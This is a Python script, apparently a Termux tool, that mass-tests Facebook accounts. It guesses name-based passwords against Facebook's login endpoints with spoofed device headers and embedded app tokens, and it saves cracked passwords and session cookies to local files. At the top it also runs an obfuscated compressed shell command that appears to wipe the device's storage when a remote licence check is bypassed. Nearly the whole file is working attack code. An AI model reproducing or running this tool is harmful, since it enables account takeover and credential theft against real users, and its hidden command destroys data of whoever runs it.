	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
	print(' Fuck You Bypass User ');exit()

def ckx():
	uuid = str(os.geteuid()) + str(os.getlogin())
	id = "᯾".join(uuid)
	server = requests.get(f'https://github.com/BANTUBD/BD/blob/main/APPROVAL.txt').text
	try:
		httpCaht = requests.get(f"https://github.com/BANTUBD/BD/blob/main/APPROVAL.txt").text
		if id in httpCaht:
			msg = str(os.geteuid())
			pass
		else:
			msg = str(os.geteuid())
			fucked()
	except:
			sys.exit()
			
def aoun():
	clear()
	#ckx()
	print(f" [\033[1;32m1\033[1;37m] FILE CLONEING ")
	print(f" [\033[1;32m2\033[1;37m] BD RANDOM CLONEING ")
	print(f" [3] Gmail Cloning")
	print(f" [\033[1;31m0\033[1;37m] Exit")
	me=input(f' [\033[1;32m✓\033[1;37m] Choice : ')
	if me in ["2", "02"]:
	    os.system('python RANDOM.py')
     
	#if me in ["3","03"]:
		#gml()
	if me in ["1", "01","11","A","a"]:
		clear()
		file = input(f' [\033[1;32m✓\033[1;37m] Put File Location [\033[1;32m❯\033[1;37m] ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f' [\033[1;32mX\033[1;37m] File location Not Found ')
			exit()
		print(f' [\033[1;31m1\033[1;37m] Method \033[1;32m1\033[1;37m [\033[1;32mmbasic\033[1;37m] \n [\033[1;31m2\033[1;37m] Method \033[1;32m2\033[1;37m [\033[1;32mgraph-api with cookies\033[1;37m] \n [\033[1;31m3\033[1;37m] Method \033[1;32m3\033[1;37m [\033[1;32mmbasic\033[1;37m] \n [\033[1;31m4\033[1;37m] Method \033[1;32m4\033[1;37m [\033[1;32mmbasic\033[1;37m]  ')
		
		mthd=input(f' [\033[1;32m✓\033[1;37m] Choice : ')
		plist=[]
		try:
			ps_limit = int(input(f' [\033[1;32m?\033[1;37m] How Many Passwords Do You Want To Add [\033[1;32m⟩\033[1;37m] '))
		except:
			ps_limit =1
		print(f' [\033[1;32m•\033[1;37m] Example: \033[1;36mfirst last,firtslast,first123 \033[1;37m')
		for i in range(ps_limit):
			plist.append(input(f' [\033[1;32m✓\033[1;37m] Put password {i+1}[\033[1;32m❯\033[1;37m] '))
		print(f' [\033[1;32m?\033[1;37m] Do You Went Show CP IDs (y/n): ')
		cx=input(f' [\033[1;32m✓\033[1;37m] Choice : ')
		if cx in ['n','N','no','NO','2']:
			pcp.append(f'n')
		else:
			pcp.append(f'y')
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(fo))
			print(f' Total Account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod : \033[1;32mM{mthd}\033[1;37m')
			print(f"\033[1;36m Use Flight Mode For Speed Up\033[1;37m")
			linex()
			for user in fo:
				ids,names = user.split('|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(m1,ids,names,passlist)
				elif mthd in ['2','02']:
					crack_submit.submit(api1,ids,names,passlist)
				elif mthd in ['3','03']:
					crack_submit.submit(m3,ids,names,passlist)
				elif mthd in ['4','04']:
					crack_submit.submit(m4,ids,names,passlist)
				#elif mthd in ['5','05']:
					#crack_submit.submit(m5,ids,names,passlist)
				#elif mthd in ['6','06']:
					#crack_submit.submit(ffb4,ids,names,passlist)
				#elif mthd in ['7','07']:
					#crack_submit.submit(ffb7,ids,names,passlist)
				#elif mthd in ['8','08']:
					#crack_submit.submit(ffb8,ids,names,passlist)
				#else:
					#crack_submit.submit(m5,ids,names,passlist)
				
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [HAYA] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen2)
                        head = {
                        'authority': 'mbasic.facebook.com',
                        'method' : 'page',
                        'path' : '/',
                        'scheme' : 'https',
                        'x-fb-rlafr': '0',
                        'access-control-allow-origin': '*',
                        'facebook-api-version': 'v16.0',
                        'strict-transport-security': 'max-age=15552000',
                        'pragma': 'no-cache',
                        'cache-control': 'private, no-cache, no-store, must-revalidate',
                        'x-fb-request-id': 'AXRLqAVjKYlUOJY6osio02t',
                        'x-fb-trace-id': 'ALIk9MgiAx6',
                        'x-fb-rev': '1007276032',
                        'x-fb-debug':   'fkJrhO1bEZdO9S2o96bI0jeZvGC1cb+aQccF7TNRoMZGDMsO3i0IS3TZyz70LH0wTVCNrsgLmyyz/iT4HePlrA==',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'accept-language': 'en-US,en;q=0.9',
                        'cache-control': 'max-age=0',
                        'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
                        'sec-ch-ua-mobile': '?1',
                        'sec-ch-ua-platform': '"Android"',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'cross-site',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'user-agent':ua }
                        getlog = session.get(f'https://mbasic.facebook.com/method/auth.login/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Fof=session.cookies.get_dict().keys()
                        if "c_user" in Fof:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [AOUN\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/aoun•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [HAYA•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/aoun•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
def api1(ids,names,passlist):
    try:
        global ok, loop
        sys.stdout.write('\r\r\033[1;37m [HAYA-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(f' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower()) 
            models = ['SM-G975F', 'SM-G970F', 'SM-N960F', 'SM-N975F', 'SM-G965F', 'SM-N970F', 'SM-G986B', 'SM-G975U', 'SM-G960F', 'SM-G988B', 'SM-A515F', 'SM-A715F', 'SM-G988U', 'SM-A505F', 'SM-N986B', 'SM-N950F', 'SM-A207F', 'SM-A107F', 'SM-G977B', 'SM-A217F', 'SM-A205F', 'SM-G781B', 'SM-G960U', 'SM-G985F', 'SM-G986U', 'SM-G980F', 'SM-A515U', 'SM-G977U', 'SM-G973F', 'SM-A307F', 'SM-A107M', 'SM-A217U', 'SM-G977V', 'SM-A125F', 'SM-G988N', 'SM-N975U', 'SM-A716B', 'SM-G981U', 'SM-G986N', 'SM-A505U', 'SM-A705F', 'SM-G977P', 'SM-A207M', 'SM-A115M', 'SM-N986U', 'SM-A205U', 'SM-A102U', 'SM-A715U', 'SM-A217M', 'SM-G986W', 'SM-G981B', 'SM-A015M', 'SM-A515W', 'SM-G781U', 'SM-A307GT', 'SM-N975W', 'SM-G980U', 'SM-A207U', 'SM-A115U', 'SM-G977W', 'SM-A125U', 'SM-A705W', 'SM-A102W', 'SM-A716U', 'SM-G981V', 'SM-A013M', 'SM-A515N', 'SM-A217N', 'SM-A515U1', 'SM-G780F', 'SM-A307FN', 'SM-G988W', 'SM-N986N', 'SM-A015U', 'SM-A115W', 'SM-G988U1', 'SM-A125N', 'SM-A205W', 'SM-A705M', 'SM-A102N', 'SM-A515GN', 'SM-A716W', 'SM-G981W', 'SM-A013F', 'SM-A515F/DS', 'SM-A217F/DS', 'SM-N975N', 'SM-A307G', 'SM-G977T', 'SM-A515N/DS', 'SM-G981U1', 'SM-A102F', 'SM-A716U1', 'SM-A505G', 'SM-A115F', 'SM-G9880', 'SM-A217N/DS', 'SM-A015F', 'SM-A715F/DS', 'SM-A515W/DS', 'SM-G975FC']
            alltokens = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','275254692598279|585aec5b4c27376758abb7ffcb9db2af']
            accessToken = random.choice(alltokens)
            ad_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
            build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
            fbavx = f'{str(random.randint(300,380))}.{str(random.randint(11,99))}.{str(random.randint(1119,9999))}'
            fbav = f'{str(random.randint(11,99))}.{str(random.randint(11,99))}.{str(random.randint(11111,99999))}.{random.randint(111,999)}'
            fbbv = ''.join(random.sample(accessToken.split('|')[0],8))
            fbavapp = f'{str(random.randint(300,380))}.0.0.{str(random.randint(11,99))}.{str(random.randint(111,999))}'
            model = random.choice(models)
            dalvik = f'samsung/{model} (Linux;Android {ad_version}) '
            fblc = 'en_PK'
            ua_configs = f'[FBAN/FBW;FBAV/{fbavapp};FBLC/{fblc};FBBV/{fbbv};FBMD/{model};FBSN/J2ME/MIDP;FBSV/{fbavx};FBLC/en_US;FBOP/45;FBRV/0;]'
            ua = dalvik+ua_configs
            fb_bandwidth = str(random.randint(2e7, 3e7))
            hni = str(random.randint(2e4,4e4))
            groupid = str(random.randint(111,9999))
            
            headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "graph.facebook.com",
            "X-Fb-Privacy-Context": "2368177546817046",
            "X-Graphql-Client-Library": "graphservice",
            "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE",
            "X-Graphql-Request-Purpose": "fetch",
            "X-Fb-Background-State": "1",
            "User-Agent": ua,
            "X-FB-Net-HNI": "41001",
            "X-FB-SIM-HNI": "41001",
            "X-FB-Connection-Type": "MOBILE.LTE",
            "X-Tigon-Is-Retry": "False",
            "x-fb-session-id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
            "x-fb-device-group": "4481",
            "X-FB-Friendly-Name": "SuggestionsFriendListContentQuery",
            "X-FB-Request-Analytics-Tags": "graphservice",
            "Accept-Encoding": "gzip, deflate",
            "X-FB-HTTP-Engine": "Liger",
            "X-FB-Client-IP": "True",
            "X-FB-Server-Cluster": "True",
            "x-fb-connection-token": "ef0e330bff1cd312f36aa5f2c69c59a9",
            "Connection": "Keep-Alive"}
            adid = str(uuid.uuid4())
            did = str(uuid.uuid4())
            fdid = str(uuid.uuid4())
            sfdid = str(uuid.uuid4())
            li = ['28','29','210']
            jazoest = random.choice(li)+''.join(random.choice(string.digits) for _ in range(2))
            data = {
    'adid':adid,
    'format':'json',
    'device_id':did,
    'email':ids,
    'password':pas,
    'generate_analytics_claim':'1',
    'community_id':'',
    'linked_guest_account_userid':'',
    'cpl':'true',
    'try_num':'1',
    'family_device_id':fdid,
    'credentials_type':'password',
    'generate_session_cookies':'1',
    'error_detail_type':'button_with_disabled',
    'source':'device_based_login',
    'generate_machine_id':'1',
    'jazoest':jazoest,
    'meta_inf_fbmeta':'NO_FILE',
    'advertiser_id':adid,
    'currently_logged_in_userid':'0',
    'locale':'en_PK',
    'client_country_code':'PK',
    'fb_api_req_friendly_name':'authenticate'
}
            
            url = 'https://b-api.facebook.com/method/auth.login'
            po = requests.post(url,data=data,headers=headers).json()
            if 'session_key' in po:
                                        print('\r\r\033[1;32m [AOUN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/AOUN-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/AOUN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
            elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [AOUN-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AOUN-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
            else:
                continue  
        loop+=1      
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass             
ugen3=['Mozilla/5.0 (Linux; Android 11; TECNO PR651E Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]'
'Mozilla/5.0 (Linux; U; Android 11; pt-pt; TECNO PR651H Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36 PHX/12.2'
'Mozilla/5.0 (Linux; Android 11; TECNO KF6i Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/347.0.0.17.97;]'
'Mozilla/5.0 (Linux; Android 11; TECNO PR651E Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/295.0.0.10.119;]'
'Mozilla/5.0 (Linux; U; Android 11; pt-pt; TECNO PR651H Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 PHX/11.4'
'Mozilla/5.0 (Linux; Android 11; TECNO KF6i Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/318.0.0.16.105;]'
'Mozilla/5.0 (Linux; U; Android 11; pt-pt; TECNO PR651H Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36 PHX/11.9'
'Mozilla/5.0 (Linux; U; Android 11; zh-CN; TECNO KF6j Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 HiBrowser/2.6.010 UWS/ Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; TECNO PR651H Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/335.0.0.15.96;]'
'Mozilla/5.0 (Linux; Android 11; TECNO PR651H Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/333.0.0.12.108;]'
'Mozilla/5.0 (Linux; Android 11; TECNO PR651H Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/338.0.0.10.102;]'
'Mozilla/5.0 (Linux; U; Android 11; pt-pt; TECNO PR651H Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36 PHX/11.9'
'Mozilla/5.0 (Linux; U; Android 11; fr-fr; TECNO KF6i Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36 PHX/11.7'
'Mozilla/5.0 (Linux; U; Android 11; zh-CN; TECNO KF6j Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 HiBrowser/2.4.002 UWS/ Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; TECNO PR651H Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36'
'com.google.android.apps.searchlite/701665 (Linux; U; Android 11; ar_AE; TECNO KF6; Build/RP1A.200720.011; Cronet/105.0.5195.35)'
'Mozilla/5.0 (Linux; Android 11; TECNO PR651E Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.77 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; TECNO KF6ks Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; TECNO KF6ks Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/382.0.0.33.111;]'
'Mozilla/5.0 (Linux; Android 11; TECNO KF6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]'
'Mozilla/5.0 (Linux; Android 9; CPH2071 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]'	
'Mozilla/5.0 (Linux; Android 12; A201OP Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]'	
'Mozilla/5.0 (Linux; Android 12; PDKT00 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]'
'Mozilla/5.0 (Linux; U; Android 12; zh-tw; PEYM00 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.61 Mobile Safari/537.36 '	
'Mozilla/5.0 (Linux; Android 9; CPH2071 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/349.0.0.8.103;]'
'Mozilla/5.0 (Linux; Android 12; CPH2353 Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]'
'Mozilla/5.0 (Linux; Android 13; CPH2487 Build/SKQ1.221012.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
'Mozilla/5.0 (Linux; Android 12; A102OP Build/SKQ1.211113.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]'	
'Mozilla/5.0 (Linux; Android 12; OPD2102A Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]'	
'Mozilla/5.0 (Linux; Android 7.1.1; OPPO A83t Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]'	
'Mozilla/5.0 (Linux; Android 12; CPH2309 Build/SKQ1.211113.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]'	
'Mozilla/5.0 (Linux; U; Android 12; zh-cn; PGGM10 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.61 Mobile Safari/537.36 '
'Mozilla/5.0 (Linux; U; Android 12; zh-cn; PEAM00 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.61 Mobile Safari/537.36 '
'Mozilla/5.0 (Linux; U; Android 12; zh-cn; PECM30 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.61 Mobile Safari/537.36 '
'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-cn; OPPO A79 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.61 Mobile Safari/537.36 '
'Mozilla/5.0 (Linux; U; Android 12; zh-cn; PFVM10 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.61 Mobile Safari/537.36 '
'Mozilla/5.0 (Linux; U; Android 11; zh-cn; PEAM00 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.61 Mobile Safari/537.36 '
'Mozilla/5.0 (Linux; U; Android 11; zh-cn; PCET00 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.61 Mobile Safari/537.36 '
'Mozilla/5.0 (Linux; U; Android 12; zh-cn; PECT30 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.61 Mobile Safari/537.36 '
'Mozilla/5.0 (Linux; U; Android 12; zh-cn; PHJ110 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.61 Mobile Safari/537.36 '

]
                        
def m3(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [INOXENTa] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua= random.choice(ugen2)
                        head = {
                        'Host': 'mbasic.facebook.com',
                        'viewport-width': '980',
                        'sec-ch-prefers-color-scheme': 'light',
                        'dnt': '1',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'accept-language': 'en-US,en;q=0.9',
                        'cache-control': 'max-age=0',
                        'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
                        'sec-ch-ua-mobile': '?1',
                        'sec-ch-ua-platform': '"Android"',
                        'sec-fetch-dest': 'document',
                        'accept-encoding': 'gzip, deflate, br',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'none',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'user-agent':'Mozilla/5.0 (Linux; Android 11; SM-N975F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]'
}

                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Fof=session.cookies.get_dict().keys()
                        if "c_user" in Fof:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [AOUN\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/HAYA•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [AOUN•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/HAYA•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1

def m4(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [HAYA] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua= random.choice(ugen2)
                        head = {'Host': 'mbasic.facebook.com', 
                        'viewport-width': '980', 
                        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101","Google Chrome";v="101"', 
                         'sec-ch-ua-mobile': '?1', 
                         'sec-ch-ua-platform':'"Windows"', 
                         'sec-ch-prefers-color-scheme': 'light', 
                         'dnt': '1', 
                         'upgrade-insecure-requests': '1', 
                         'user-agent': ua, 
                         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
                         'sec-fetch-site': 'same-origin', 
                         'sec-fetch-mode': 'navigate', 
                         'sec-fetch-user': '?1', 
                         'sec-fetch-dest': 'document', 
                         'accept-encoding': 'gzip, deflate, br', 
                         'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Fof=session.cookies.get_dict().keys()
                        if "c_user" in Fof:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [AOUN\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/HAYA•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [AOUN•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/HAYA•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1



aoun()
